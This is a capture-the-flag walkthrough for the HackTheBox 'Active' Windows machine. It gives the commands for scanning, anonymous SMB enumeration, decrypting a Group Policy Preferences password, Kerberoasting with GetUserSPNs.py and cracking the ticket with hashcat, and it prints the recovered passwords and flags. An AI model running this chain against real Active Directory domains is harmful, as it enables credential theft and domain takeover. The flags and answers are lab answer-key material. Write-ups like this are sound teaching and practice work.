# HackTheBox Walkthrough - Active

**Machine Name**: Active  
**Target IP**: 10.129.225.44  
**Operating System**: Windows  
**Difficulty**: Easy  

---

## 🧭 Enumeration

### 🔍 Port Scan

```bash
nmap -Pn -n --open -p- --max-retries 1 --min-rate 2000 10.129.225.44
nmap -sV -sC -oA nmap/Active -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168 10.129.225.44
```

### 🔐 SMB Shares

```bash
smbclient -L //10.129.225.44 -N
```

**Shares Found**:
- ADMIN$
- C$
- IPC$
- NETLOGON
- Replication
- SYSVOL
- Users

🟢 **Answer: 7**

---

## 📁 Anonymous Share Access

Accessible share: `Replication`  
🟢 **Answer: Replication**

---

## 🔎 Credentials Discovery

From `Groups.xml`:
```xml
<User name="active.htb\SVC_TGS" ... cpassword="edBSHOwhZLTjt/...">
```

Decrypted with `gpp-decrypt`:
```bash
gpp-decrypt 'edBSHOwhZLTjt/...'
```

🟢 **Answer: GPPstillStandingStrong2k18**

---

## 🧑‍💻 User Flag Access

```bash
smbclient -U 'ACTIVE\SVC_TGS' //10.129.225.44/Users
smb: \SVC_TGS\Desktop\> get user.txt
```

🟢 **Flag**: `2b1315e704553f8423562cb29ed99ea1`

---

## 🦞 Kerberoasting

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.225.44
```

Vulnerable account: `Administrator`  
🟢 **Answer: Administrator**

---

## 🔓 Cracking TGS Hash

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.225.44 -request
# Save TGS hash and run:
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
```

🟢 **Password**: `Ticketmaster1968`

---

## 👑 Root Flag

```bash
smbclient -U 'ACTIVE\Administrator' //10.129.225.44/Users
smb: \Administrator\Desktop\> get root.txt
```

🟢 **Flag**: `1fdde5163e1c0ee88a54fa5facb901a1`
